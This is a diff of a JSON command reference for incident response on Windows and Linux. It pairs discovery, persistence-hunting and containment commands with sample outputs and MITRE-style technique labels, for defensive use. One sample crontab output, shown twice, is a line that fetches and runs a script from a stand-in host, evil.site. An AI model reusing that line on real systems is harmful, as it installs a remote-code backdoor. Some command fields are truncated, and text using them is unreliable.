+      "output": "TCP    0.0.0.0:135    0.0.0.0:0    LISTENING    1000",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Show listening connections (PowerShell)",
+      "command": "Get-NetTCPConnection -State Listen",
+      "desc": "Get listening connections using PowerShell",
+      "example": "Get-NetTCPConnection -State Listen",
+      "output": "LocalAddress  LocalPort  RemoteAddress  State\\n0.0.0.0       135        0.0.0.0        Listen",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Show logged users (CMD)",
+      "command": "query user",
+      "desc": "Display currently logged in users",
+      "example": "query user",
+      "output": "USERNAME  SESSIONNAME  ID  STATE\\nadmin     console      1   Active",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Show logged users (PowerShell)",
+      "command": "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName",
+      "desc": "Get current logged user via PowerShell",
+      "example": "Get-WmiObject -Class Win32_ComputerSystem | Select UserName",
+      "output": "DOMAIN\\username",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Show registry key (CMD)",
+      "command": "reg query <keypath>",
+      "desc": "Query registry key",
+      "example": "reg query HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+      "output": "OneDrive    REG_SZ    C:\\\\Program Files\\\\OneDrive.exe",
+      "technique": "Registry Discovery"
+    },
+    {
+      "title": "Show registry key (PowerShell)",
+      "command": "Get-ItemProperty -Path <keypath>",
+      "desc": "Get registry properties using PowerShell",
+      "example": "Get-ItemProperty -Path HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+      "output": "OneDrive : C:\\\\Program Files\\\\OneDrive.exe",
+      "technique": "Registry Discovery"
     },
     {
       "title": "Show running process services",
@@ -222,148 +687,76 @@
       "output": "Image Name                     PID Session Name        Session#    Mem Usage\\nexplorer.exe                  2036 Console                    1     76,712 K"
     },
     {
-      "title": "Show all scheduled tasks/jobs",
+      "title": "Show running processes (CMD)",
+      "command": "tasklist /v",
+      "desc": "List all running processes",
+      "example": "tasklist /v",
+      "output": "Image Name  PID   Session  Mem Usage\\nexplorer.exe  1234  Console1  50,000 K",
+      "technique": "Process Discovery"
+    },
+    {
+      "title": "Show running processes (PowerShell)",
+      "command": "Get-Process",
+      "desc": "Get all processes using PowerShell",
+      "example": "Get-Process",
+      "output": "Handles  NPM(K)    PM(K)      WS(K)\\n500      20        10000      20000",
+      "technique": "Process Discovery"
+    },
+    {
+      "title": "Show scheduled tasks (CMD)",
       "command": "schtasks /query /fo LIST /v",
-      "desc": "Enumerates all scheduled tasks, triggers, run-as credentials. Essential for persistence or unusual scheduled code detections.",
-      "example": "schtasks /query /fo LIST /v",
-      "technique": "Scheduled Task/Job",
-      "output": "TaskName:             \\\\UpdateTask\\nNext Run Time:         10/18/2025 2:00:00 AM\\nStatus:                Ready\\nLast Run Result:       0\\nScheduled Task State:  Enabled"
+      "desc": "List all scheduled tasks",
+      "example": "schtasks /query /fo LIST",
+      "output": "TaskName: \\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
+      "technique": "Scheduled Task Discovery"
     },
     {
-      "title": "Delete a scheduled task",
-      "command": "schtasks /delete /tn \\",
-      "desc": "Removes a suspicious persistence task.",
-      "example": "schtasks /delete /tn \\",
-      "technique": "Defense Evasion",
-      "output": "SUCCESS: The scheduled task \"malicious_task\" was successfully deleted."
+      "title": "Show scheduled tasks (PowerShell)",
+      "command": "Get-ScheduledTask",
+      "desc": "Get all scheduled tasks",
+      "example": "Get-ScheduledTask",
+      "output": "TaskName                 State\\nScheduled Scan          Ready",
+      "technique": "Scheduled Task Discovery"
     },
     {
-      "title": "Find user logon persistence/startup programs",
+      "title": "Show services (CMD)",
+      "command": "sc query",
+      "desc": "List all services",
+      "example": "sc query",
+      "output": "SERVICE_NAME: wuauserv\\nSTATE: RUNNING",
+      "technique": "Service Discovery"
+    },
+    {
+      "title": "Show services (PowerShell)",
+      "command": "Get-Service",
+      "desc": "List all services using PowerShell",
+      "example": "Get-Service",
+      "output": "Status   Name               DisplayName\\nRunning  wuauserv           Windows Update",
+      "technique": "Service Discovery"
+    },
+    {
+      "title": "Show startup programs (CMD)",
       "command": "wmic startup get caption,command",
-      "desc": "Identifies executables or commands set to run on logon; a common attacker persistence mechanism.",
+      "desc": "List all startup programs",
       "example": "wmic startup get caption,command",
-      "technique": "Boot or Logon Autostart Execution",
-      "output": "Caption            Command\\nOneDrive            \"C:\\\\Program Files\\\\Microsoft OneDrive\\\\OneDrive.exe\" /background\\nMaliciousUpdater    \"C:\\\\Temp\\\\evil.exe\""
+      "output": "Caption      Command\\nOneDrive     C:\\\\Program Files\\\\OneDrive.exe",
+      "technique": "Boot or Logon Autostart"
     },
     {
-      "title": "Enumerate autostart registry entries",
-      "command": "reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
-      "desc": "Lists programs configured to auto-start system-wide.",
-      "example": "reg query HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
-      "technique": "Registry Run Keys / Startup Folder",
-      "output": "malware.exe    REG_SZ    C:\\\\Users\\\\Public\\\\malware.exe"
+      "title": "Show startup programs (PowerShell)",
+      "command": "Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location",
+      "desc": "Get startup programs using PowerShell",
+      "example": "Get-CimInstance Win32_StartupCommand | Select Name, command",
+      "output": "Name      command\\nOneDrive  C:\\\\Program Files\\\\OneDrive.exe",
+      "technique": "Boot or Logon Autostart"
     },
     {
-      "title": "Search registry for suspicious startup paths",
-      "command": "reg query HKLM /f evil.exe /t REG_SZ /s",
-      "desc": "Quickly locates registry persistence referencing a malicious binary.",
-      "example": "reg query HKLM /f malware.exe /s",
-      "technique": "Persistence Discovery",
-      "output": "HKEY_LOCAL_MACHINE\\\\...\\\\Run    REG_SZ    C:\\\\Windows\\\\evil.exe"
-    },
-    {
-      "title": "List startup folder items",
-      "command": "dir \\",
-      "desc": "Displays scripts, links, or executables set to auto-launch on logon.",
-      "example": "dir C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup",
-      "technique": "Startup Folder Persistence",
-      "output": "10/22/2025  10:00 AM  evilshortcut.lnk"
-    },
-    {
-      "title": "List all event log channels",
-      "command": "wevtutil el",
-      "desc": "Lists all event log sources and channels; enumerate for advanced log demand.",
-      "example": "wevtutil el",
-      "technique": "Event Log Discovery",
-      "output": "System\\nSecurity\\nApplication\\nSetup\\nWindows PowerShell\\n..."
-    },
-    {
-      "title": "Get last 10 security events",
-      "command": "wevtutil qe Security /f:text /c:10",
-      "desc": "View the 10 most recent events in the Windows Security log—for authentication, escalation, and anomaly hunting.",
-      "example": "wevtutil qe Security /f:text /c:10",
-      "technique": "Authentication Discovery",
-      "output": "Event[0]:\\n  LogonType: 2 (Interactive)\\n  Subject: johndoe\\n  Message: An account was successfully logged on."
-    },
-    {
-      "title": "Show all active network connections and owning process PID",
-      "command": "netstat -ano",
-      "desc": "Displays all open TCP/UDP ports and their owning processes. Critical for finding C2 beaconing, lateral movement, or malware listeners.",
-      "example": "netstat -ano",
-      "technique": "Network Connection Discovery",
-      "output": "Proto  Local Address          Foreign Address        State           PID\\nTCP    0.0.0.0:3389          0.0.0.0:0              LISTENING       1048\\nTCP    192.168.56.1:139      0.0.0.0:0              LISTENING       4\\nUDP    0.0.0.0:123           *:*                                   608"
-    },
-    {
-      "title": "List all listening ports with process info",
-      "command": "netstat -abno",
-      "desc": "Displays the executable associated with each network connection or listener.",
-      "example": "netstat -abno | more",
-      "technique": "Network Service Discovery",
-      "output": "[powershell.exe] TCP 0.0.0.0:5985 LISTENING 1234"
-    },
-    {
-      "title": "Display network interfaces and IPs",
-      "command": "ipconfig /all",
-      "desc": "Useful for detecting rogue adapters or DNS manipulation.",
-      "example": "ipconfig /all",
-      "technique": "Network Configuration Discovery",
-      "output": "Ethernet adapter CorpNet: IPv4 Address: 10.0.0.10"
-    },
-    {
-      "title": "View active Windows Firewall rules",
-      "command": "netsh advfirewall firewall show rule name=all",
-      "desc": "Lists all defined inbound/outbound rules for anomaly checks.",
-      "example": "netsh advfirewall firewall show rule name=all | findstr /i block",
-      "technique": "Firewall Configuration Discovery",
-      "output": "Rule Name: Block Suspicious Connection"
-    },
-    {
-      "title": "Show all Windows firewall profiles and rules",
-      "command": "netsh advfirewall show allprofiles",
-      "desc": "Diagnose open/closed firewall profiles and find dangerous exceptions.",
-      "example": "netsh advfirewall show allprofiles",
-      "technique": "Firewall/Network Security Discovery",
-      "output": "Domain Profile Settings:\\n----------------------------------------------------------------------\\nState                                 ON\\nAllow inbound remote admin exceptions: No\\n..."
-    },
-    {
-      "title": "Enable firewall for all profiles",
-      "command": "netsh advfirewall set allprofiles state on",
-      "desc": "Ensures firewall protection is active system-wide.",
-      "example": "netsh advfirewall set allprofiles state on",
-      "technique": "Firewall Control",
-      "output": "Ok."
-    },
-    {
-      "title": "Check domain, public, and private firewall profiles",
-      "command": "netsh advfirewall show allprofiles",
-      "desc": "Displays status and global settings for each network profile.",
-      "example": "netsh advfirewall show allprofiles",
-      "technique": "Firewall State Review",
-      "output": "Domain Profile: ON, Private Profile: ON, Public Profile: OFF"
-    },
-    {
-      "title": "View Microsoft Defender status",
-      "command": "sc query windefend",
-      "desc": "Confirms Defender service is active and operational.",
-      "example": "sc query windefend",
-      "technique": "Security Software Discovery",
-      "output": "SERVICE_NAME: WinDefend\\nSTATE: 4  RUNNING"
-    },
-    {
-      "title": "Quick Defender full scan",
-      "command": "MpCmdRun -Scan -ScanType 2",
-      "desc": "Start a full antivirus scan with Windows Defender to catch malware or backdoors.",
-      "example": "MpCmdRun -Scan -ScanType 2",
-      "technique": "Malware Detection",
-      "output": "Scan started...\\nThreats found: 0"
-    },
-    {
-      "title": "Run quick Defender scan",
-      "command": "MpCmdRun.exe -Scan -ScanType 1",
-      "desc": "Triggers a quick malware scan using Windows Defender CLI.",
-      "example": "\\",
-      "technique": "Malware Detection",
-      "output": "Scan starting...\\nNo threats detected."
+      "title": "Terminate network connection (PowerShell)",
+      "command": "Get-NetTCPConnection -RemoteAddress <ip> | Remove-NetTCPConnection -Confirm:$false",
+      "desc": "Close network connection to specific IP",
+      "example": "Get-NetTCPConnection -RemoteAddress 10.0.0.5 | Remove-NetTCPConnection",
+      "output": "",
+      "technique": "Network Blocking"
     },
     {
       "title": "Update Defender definitions",
@@ -374,110 +767,150 @@
       "output": "Signature update started...\\nCompleted successfully."
     },
     {
-      "title": "Dump file/folder ACLs (permissions)",
-      "command": "icacls C:\\\\SensitiveFolder",
-      "desc": "Audit file/folder permissions for excessive, risky or exfil-targeted files.",
-      "example": "icacls C:\\\\SensitiveFolder",
-      "technique": "File and Directory Discovery",
-      "output": "C:\\\\SensitiveFolder BUILTIN\\\\Administrators:(I)(F)\\nNT AUTHORITY\\\\SYSTEM:(I)(F)\\nEveryone:(I)(OI)(CI)(RX)"
+      "title": "View Microsoft Defender status",
+      "command": "sc query windefend",
+      "desc": "Confirms Defender service is active and operational.",
+      "example": "sc query windefend",
+      "technique": "Security Software Discovery",
+      "output": "SERVICE_NAME: WinDefend\\nSTATE: 4  RUNNING"
+    },
+    {
+      "title": "View active Windows Firewall rules",
+      "command": "netsh advfirewall firewall show rule name=all",
+      "desc": "Lists all defined inbound/outbound rules for anomaly checks.",
+      "example": "netsh advfirewall firewall show rule name=all | findstr /i block",
+      "technique": "Firewall Configuration Discovery",
+      "output": "Rule Name: Block Suspicious Connection"
+    },
+    {
+      "title": "View current Kerberos tickets",
+      "command": "klist",
+      "desc": "Shows active Kerberos tickets in user session.",
+      "example": "klist",
+      "technique": "Credential Access",
+      "output": "Client: john@CORP.LOCAL\\nServer: krbtgt/CORP.LOCAL\\nEnd Time: 10/22/2025 11:30:45"
+    },
+    {
+      "title": "View detailed user information",
+      "command": "net user jdoe",
+      "desc": "Shows password policies, account creation details, and group memberships.",
+      "example": "net user jdoe",
+      "technique": "Account Discovery",
+      "output": "User name: jdoe\\nLocal Group Memberships: Administrators  Users\\nPassword last set: 10/15/2025"
+    },
+    {
+      "title": "View domain user properties",
+      "command": "net user <username> /domain",
+      "desc": "View domain user properties",
+      "example": "net user jdoe /domain",
+      "output": "User name: jdoe\\nFull Name: John Doe",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "View members of specific AD group",
+      "command": "net group \\",
+      "desc": "Shows members of key privileged domain groups.",
+      "example": "net group \\",
+      "technique": "Privilege Enumeration",
+      "output": "Members of group Domain Admins:\\n-------------------------------------------------\\nAdministrator\\nSOC-IRTeam"
+    },
+    {
+      "title": "View user properties",
+      "command": "net user <username>",
+      "desc": "View detailed properties of a specific user",
+      "example": "net user Administrator",
+      "output": "User name: Administrator\\nFull Name: \\nAccount active: Yes",
+      "technique": "Account Discovery"
     }
   ],
   "linux": [
     {
-      "title": "List all user accounts",
-      "command": "cat /etc/passwd",
-      "desc": "Enumerates every local account, including dormant/service accounts. Check for unauthorized or recently added users.",
-      "example": "cat /etc/passwd",
-      "technique": "Valid Accounts",
-      "output": "root:x:0:0:root:/root:/bin/bash\nuser1:x:1001:1001:User One:/home/user1:/bin/bash"
-    },
-    {
-      "title": "Show all currently logged-in users",
-      "command": "who",
-      "desc": "Lists interactive shell sessions for the system. Look for anomalous users or consoles.",
-      "example": "who",
+      "title": "Check user sudo rights",
+      "command": "sudo -l",
+      "desc": "Shows what sudo privileges a user has (for escalation traces).",
+      "example": "sudo -l",
       "technique": "Account Discovery",
-      "output": "user1  pts/0        2025-10-17 08:42 (:0)"
+      "output": "User root may run the following commands on this host:\n    (ALL : ALL) ALL\n    (ALL) NOPASSWD: /usr/bin/vim"
     },
     {
-      "title": "Show login/logout history (timeline)",
-      "command": "last",
-      "desc": "Shows when each user/session last logged on/off. Includes SSH, local, and reboot.",
-      "example": "last",
-      "technique": "Logon Session Discovery",
-      "output": "user1  pts/0        2025-10-16 07:22   still logged in\nreboot system boot  2025-10-15 07:19"
+      "title": "Delete cron job",
+      "command": "crontab -e",
+      "desc": "Edit crontab to remove entries (interactive)",
+      "example": "crontab -e",
+      "output": "# Edit and save to remove entries",
+      "technique": "Defense Evasion"
     },
     {
-      "title": "Show last login for each user",
-      "command": "lastlog",
-      "desc": "When was the last successful login for every account?",
-      "example": "lastlog",
-      "technique": "Account Discovery",
-      "output": "Username         Port     From             Latest\nroot             pts/0    192.168.1.2      Fri Oct 17 09:23:11 +0000 2025"
+      "title": "Delete file including hidden",
+      "command": "rm -f <filepath>",
+      "desc": "Force delete file",
+      "example": "rm -f /tmp/malware",
+      "output": "",
+      "technique": "File Deletion"
     },
     {
-      "title": "Show group memberships (privilege review)",
-      "command": "cat /etc/group",
-      "desc": "Discovers group and sudo/admin memberships for lateral movement and privilege escalation.",
-      "example": "cat /etc/group",
-      "technique": "Account Discovery",
-      "output": "sudo:x:27:user1,analyst\nadm:x:4:user1,syslog"
+      "title": "Delete folder including hidden",
+      "command": "rm -rf <folderpath>",
+      "desc": "Recursively force delete folder",
+      "example": "rm -rf /tmp/malware_folder",
+      "output": "",
+      "technique": "File Deletion"
     },
     {
-      "title": "List running processes (complete)",
-      "command": "ps aux",
-      "desc": "Shows all processes, owners, and resource usage. Essential for malware and rootkit hunting.",
-      "example": "ps aux",
-      "technique": "Process Discovery",
-      "output": "root    1  0.0  0.3  16900  1864 ?  Ss   10:01   0:04 /sbin/init\nuser1 2011  0.0  0.1  11636   904 pts/0    S+   10:58   0:00 bash"
+      "title": "Delete service",
+      "command": "sudo systemctl stop <service>; sudo systemctl disable <service>; sudo rm /etc/systemd/system/<service>.service",
+      "desc": "Stop, disable and remove service",
+      "example": "sudo systemctl stop malicious.service; sudo systemctl disable malicious.service",
+      "output": "Removed /etc/systemd/system/malicious.service",
+      "technique": "Defense Evasion"
     },
     {
-      "title": "Show process tree (parent-child linkage)",
-      "command": "pstree -p",
-      "desc": "Hierarchical view of processesâ€”find suspicious parents, injected code, etc.",
-      "example": "pstree -p",
-      "technique": "Process Discovery",
-      "output": "systemd(1)â”€sshd(766)â”€bash(2013)â”€pstree(2089)"
+      "title": "Delete startup program",
+      "command": "sudo systemctl disable <service>; sudo rm /etc/systemd/system/<service>",
+      "desc": "Disable and remove startup service",
+      "example": "sudo systemctl disable malware.service",
+      "output": "Removed /etc/systemd/system/multi-user.target.wants/malware.service",
+      "technique": "Defense Evasion"
     },
     {
-      "title": "Monitor resource usage live",
-      "command": "top -n 1",
-      "desc": "Displays system-wide CPU, memory usage, and top processes. Reveals runaway/abusive activity.",
-      "example": "top -n 1",
-      "technique": "Process Discovery",
-      "output": "top - 10:30:34 up 20 days, 5:21, 2 users, load average: 0.03, 0.09, 0.09\nTasks: 92 total, 1 running, 91 sleeping, 0 stopped, 0 zombie\n%Cpu(s): 3.0 us, 1.0 sy, 0.0 ni, 96.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st"
+      "title": "Disable domain user",
+      "command": "sudo samba-tool user disable <username>",
+      "desc": "Disable domain user in Samba AD",
+      "example": "sudo samba-tool user disable jdoe",
+      "output": "Disabled user 'jdoe'",
+      "technique": "Account Management"
     },
     {
-      "title": "List listening/open ports",
-      "command": "ss -tuln",
-      "desc": "Find server services, network listeners, and unwanted/rogue daemons.",
-      "example": "ss -tuln",
-      "technique": "Network Service Discovery",
-      "output": "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port\nudp   UNCONN 0      0      0.0.0.0:68     0.0.0.0:*"
+      "title": "Disable local user",
+      "command": "sudo usermod -L <username>",
+      "desc": "Lock user account",
+      "example": "sudo usermod -L user1",
+      "output": "",
+      "technique": "Account Management"
     },
     {
-      "title": "Show external connections (with process mapping)",
-      "command": "netstat -antup",
-      "desc": "List all connections and find malware communicating with outside hosts.",
-      "example": "netstat -antup",
-      "technique": "Network Connection Discovery",
-      "output": "tcp    0    0 0.0.0.0:22   0.0.0.0:*    LISTEN   1053/sshd\ntcp    0    0 192.168.1.2:47724  93.184.216.34:443  ESTABLISHED  1000/malware"
+      "title": "Enable domain user",
+      "command": "sudo samba-tool user enable <username>",
+      "desc": "Enable domain user in Samba AD",
+      "example": "sudo samba-tool user enable jdoe",
+      "output": "Enabled user 'jdoe'",
+      "technique": "Account Management"
     },
     {
-      "title": "Show open files for a process",
-      "command": "lsof -p [PID]",
-      "desc": "See what files, sockets etc., a process is using. Correlate with malware or data theft.",
-      "example": "lsof -p 1053",
-      "technique": "File and Directory Discovery",
-      "output": "COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF  NODE NAME\nsshd      1053 root  3u  IPv4  6947      0t0    TCP *:22 (LISTEN)"
+      "title": "Enable local user",
+      "command": "sudo usermod -U <username>",
+      "desc": "Unlock user account",
+      "example": "sudo usermod -U user1",
+      "output": "",
+      "technique": "Account Management"
     },
     {
-      "title": "Show recent authentication logins/errors",
-      "command": "cat /var/log/auth.log | tail -n 10",
-      "desc": "View authentication attempts, failed logins, sudo requests.",
-      "example": "cat /var/log/auth.log",
-      "technique": "Authentication Discovery",
-      "output": "Oct 17 10:44:14 server sshd[1227]: Accepted password for user1 from 192.168.1.50 port 54012 ssh2\nOct 17 10:45:02 server su[1332]: pam_unix(su-l:session): session opened for user root"
+      "title": "Find SUID-root binaries (privesc)",
+      "command": "find / -user root -perm -4000 -print 2>/dev/null",
+      "desc": "Find all files running as root (possible privilege escalation vectors).",
+      "example": "find / -user root -perm -4000 -print 2>/dev/null",
+      "technique": "Privilege Escalation",
+      "output": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp"
     },
     {
       "title": "Find files modified recently",
@@ -488,52 +921,20 @@
       "output": "123456    8 -rw-r--r--   1 root root  1024 Oct 15 23:54 /tmp/malicious.sh"
     },
     {
-      "title": "List user's cron jobs",
-      "command": "crontab -l",
-      "desc": "See all scheduled jobs for the current user (for persistence, hack tools, beacons).",
-      "example": "crontab -l",
-      "technique": "Persistence via Scheduled Task",
-      "output": "@reboot /usr/bin/curl -fsSL http://evil.site/b.sh | sh"
+      "title": "Get IP and hostname",
+      "command": "ip addr; hostname",
+      "desc": "Display IP addresses and hostname",
+      "example": "ip addr; hostname",
+      "output": "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>\\ninet 192.168.1.10/24\\nubuntu-server",
+      "technique": "System Network Configuration"
     },
     {
-      "title": "List all network interfaces",
-      "command": "ifconfig -a",
-      "desc": "View every active/virtual/stale NIC. Find malicious or unauthorized network interfaces.",
-      "example": "ifconfig -a",
-      "technique": "Network Configuration Discovery",
-      "output": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\ninet 192.168.1.111  netmask 255.255.255.0\ninet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>"
-    },
-    {
-      "title": "Show the ARP table (local devices)",
-      "command": "arp -a",
-      "desc": "Find devices on the same network segmentâ€”may be involved in lateral movement or attack.",
-      "example": "arp -a",
-      "technique": "Network Discovery",
-      "output": "router (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0"
-    },
-    {
-      "title": "Show all systemd services",
-      "command": "systemctl list-units --type=service",
-      "desc": "Audit all loaded/running system servicesâ€”hunt persistence/rootkits.",
-      "example": "systemctl list-units --type=service",
-      "technique": "Service Discovery",
-      "output": "UNIT                    LOAD   ACTIVE SUB     DESCRIPTION\nsshd.service            loaded active running OpenSSH Daemon\ncron.service            loaded active running Regular background program processing daemon"
-    },
-    {
-      "title": "Show last boot log",
-      "command": "cat /var/log/boot.log | tail -n 10",
-      "desc": "Check for boot errors, crash evidence.",
-      "example": "cat /var/log/boot.log",
-      "technique": "Event Log Discovery",
-      "output": "Started Update UTMP about System Boot/Shutdown.\nFinished Raise network interfaces."
-    },
-    {
-      "title": "Show all command history (.bash_history)",
-      "command": "history | less",
-      "desc": "See all shell activity; traces of post-exploitation, privilege escalation, and data theft.",
-      "example": "history | less",
-      "technique": "Command and Script Execution",
-      "output": "2025  cd /tmp\n2026  bash b.sh\n2027  rm b.sh"
+      "title": "Get user SID (UID)",
+      "command": "id -u <username>",
+      "desc": "Get user ID (Linux equivalent of SID)",
+      "example": "id -u root",
+      "output": "0",
+      "technique": "Account Discovery"
     },
     {
       "title": "Inspect kernel ring buffer activity",
@@ -544,20 +945,92 @@
       "output": "[1623042.912838] audit: type=1100 audit(1631893462.321:52): pid=3608 uid=0 auid=1000 ..."
     },
     {
-      "title": "Show root/system-wide crontab",
-      "command": "cat /etc/crontab",
-      "desc": "System-wide scheduled tasks. Look for privileged malware tasks.",
-      "example": "cat /etc/crontab",
-      "technique": "Persistence via Scheduled Task",
-      "output": "0 2 * * * root /usr/local/bin/backup.sh\n* * * * * root /tmp/maliciousTask.sh"
+      "title": "Kill process",
+      "command": "kill -9 <pid>",
+      "desc": "Force kill process by PID",
+      "example": "kill -9 1234",
+      "output": "",
+      "technique": "Process Termination"
     },
     {
-      "title": "Show loaded kernel modules",
-      "command": "lsmod",
-      "desc": "Lists all loaded modules; rootkits and hardware support.",
-      "example": "lsmod",
-      "technique": "Kernel Module Discovery",
-      "output": "Module                  Size  Used by\next4                  487424  1"
+      "title": "List all network interfaces",
+      "command": "ifconfig -a",
+      "desc": "View every active/virtual/stale NIC. Find malicious or unauthorized network interfaces.",
+      "example": "ifconfig -a",
+      "technique": "Network Configuration Discovery",
+      "output": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\ninet 192.168.1.111  netmask 255.255.255.0\ninet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>"
+    },
+    {
+      "title": "List all user accounts",
+      "command": "cat /etc/passwd",
+      "desc": "Enumerates every local account, including dormant/service accounts. Check for unauthorized or recently added users.",
+      "example": "cat /etc/passwd",
+      "technique": "Valid Accounts",
+      "output": "root:x:0:0:root:/root:/bin/bash\nuser1:x:1001:1001:User One:/home/user1:/bin/bash"
+    },
+    {
+      "title": "List files including hidden",
+      "command": "ls -la <path>",
+      "desc": "List all files including hidden",
+      "example": "ls -la /home/user",
+      "output": "drwxr-xr-x  2 user user 4096 Oct 23 14:00 .\\n-rw-r--r--  1 user user  123 Oct 23 14:00 .bashrc",
+      "technique": "File Discovery"
+    },
+    {
+      "title": "List listening/open ports",
+      "command": "ss -tuln",
+      "desc": "Find server services, network listeners, and unwanted/rogue daemons.",
+      "example": "ss -tuln",
+      "technique": "Network Service Discovery",
+      "output": "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port\nudp   UNCONN 0      0      0.0.0.0:68     0.0.0.0:*"
+    },
+    {
+      "title": "List running processes (complete)",
+      "command": "ps aux",
+      "desc": "Shows all processes, owners, and resource usage. Essential for malware and rootkit hunting.",
+      "example": "ps aux",
+      "technique": "Process Discovery",
+      "output": "root    1  0.0  0.3  16900  1864 ?  Ss   10:01   0:04 /sbin/init\nuser1 2011  0.0  0.1  11636   904 pts/0    S+   10:58   0:00 bash"
+    },
+    {
+      "title": "List user's cron jobs",
+      "command": "crontab -l",
+      "desc": "See all scheduled jobs for the current user (for persistence, hack tools, beacons).",
+      "example": "crontab -l",
+      "technique": "Persistence via Scheduled Task",
+      "output": "@reboot /usr/bin/curl -fsSL http://evil.site/b.sh | sh"
+    },
+    {
+      "title": "List users",
+      "command": "cat /etc/passwd",
+      "desc": "List all user accounts",
+      "example": "cat /etc/passwd",
+      "output": "root:x:0:0:root:/root:/bin/bash\\nuser1:x:1000:1000::/home/user1:/bin/bash",
+      "technique": "Account Discovery"
+    },
+    {
+      "title": "Logoff user",
+      "command": "sudo pkill -KILL -u <username>",
+      "desc": "Force logoff user by killing all their processes",
+      "example": "sudo pkill -KILL -u user1",
+      "output": "",
+      "technique": "Account Management"
+    },
+    {
+      "title": "Monitor resource usage live",
+      "command": "top -n 1",
+      "desc": "Displays system-wide CPU, memory usage, and top processes. Reveals runaway/abusive activity.",
+      "example": "top -n 1",
+      "technique": "Process Discovery",
+      "output": "top - 10:30:34 up 20 days, 5:21, 2 users, load average: 0.03, 0.09, 0.09\nTasks: 92 total, 1 running, 91 sleeping, 0 stopped, 0 zombie\n%Cpu(s): 3.0 us, 1.0 sy, 0.0 ni, 96.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st"
+    },
+    {
+      "title": "Resolve hostname from IP",
+      "command": "nslookup <ipaddress>",
+      "desc": "Resolve IP to hostname",
+      "example": "nslookup 8.8.8.8",
+      "output": "Server:  8.8.8.8\\nName:    dns.google",
+      "technique": "Network Discovery"
     },
     {
       "title": "Review SSH authorized_keys",
@@ -568,72 +1041,207 @@
       "output": "ssh-rsa AAAAB3Nza... user1@server"
     },
     {
-      "title": "Check user sudo rights",
-      "command": "sudo -l",
-      "desc": "Shows what sudo privileges a user has (for escalation traces).",
-      "example": "sudo -l",
-      "technique": "Account Discovery",
-      "output": "User root may run the following commands on this host:\n    (ALL : ALL) ALL\n    (ALL) NOPASSWD: /usr/bin/vim"
+      "title": "Show all command history (.bash_history)",
+      "command": "history | less",
+      "desc": "See all shell activity; traces of post-exploitation, privilege escalation, and data theft.",
+      "example": "history | less",
+      "technique": "Command and Script Execution",
+      "output": "2025  cd /tmp\n2026  bash b.sh\n2027  rm b.sh"
     },
     {
-      "title": "Find SUID-root binaries (privesc)",
-      "command": "find / -user root -perm -4000 -print 2>/dev/null",
-      "desc": "Find all files running as root (possible privilege escalation vectors).",
-      "example": "find / -user root -perm -4000 -print 2>/dev/null",
-      "technique": "Privilege Escalation",
-      "output": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp"
+      "title": "Show all cron jobs",
+      "command": "sudo cat /etc/crontab; ls -la /etc/cron.*",
+      "desc": "List all system cron jobs",
+      "example": "sudo cat /etc/crontab",
+      "output": "0 5 * * * root /usr/bin/daily_backup",
+      "technique": "Scheduled Task Discovery"
+    },
+    {
+      "title": "Show all currently logged-in users",
+      "command": "who",
+      "desc": "Lists interactive shell sessions for the system. Look for anomalous users or consoles.",
+      "example": "who",
+      "technique": "Account Discovery",
+      "output": "user1  pts/0        2025-10-17 08:42 (:0)"
+    },
+    {
+      "title": "Show all systemd services",
+      "command": "systemctl list-units --type=service",
+      "desc": "Audit all loaded/running system servicesâ€”hunt persistence/rootkits.",
+      "example": "systemctl list-units --type=service",
+      "technique": "Service Discovery",
+      "output": "UNIT                    LOAD   ACTIVE SUB     DESCRIPTION\nsshd.service            loaded active running OpenSSH Daemon\ncron.service            loaded active running Regular background program processing daemon"
+    },
+    {
+      "title": "Show cron jobs",
+      "command": "crontab -l",
+      "desc": "List user's cron jobs",
+      "example": "crontab -l",
+      "output": "0 * * * * /usr/bin/backup.sh\\n30 2 * * * /home/user/script.sh",
+      "technique": "Scheduled Task Discovery"
+    },
+    {
+      "title": "Show established connections",
+      "command": "ss -tun state established",
+      "desc": "Show established network connections",
+      "example": "ss -tun state established",
+      "output": "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port\\ntcp   ESTAB  0      0      192.168.1.10:22      10.0.0.5:51234",
+      "technique": "Network Connection Discovery"
+    },
+    {
+      "title": "Show external connections (with process mapping)",
+      "command": "netstat -antup",
+      "desc": "List all connections and find malware communicating with outside hosts.",
+      "example": "netstat -antup",
+      "technique": "Network Connection Discovery",
+      "output": "tcp    0    0 0.0.0.0:22   0.0.0.0:*    LISTEN   1053/sshd\ntcp    0    0 192.168.1.2:47724  93.184.216.34:443  ESTABLISHED  1000/malware"
+    },
+    {
+      "title": "Show file properties",
+      "command": "stat <filepath>",
+      "desc": "Display detailed file information",
+      "example": "stat /bin/bash",
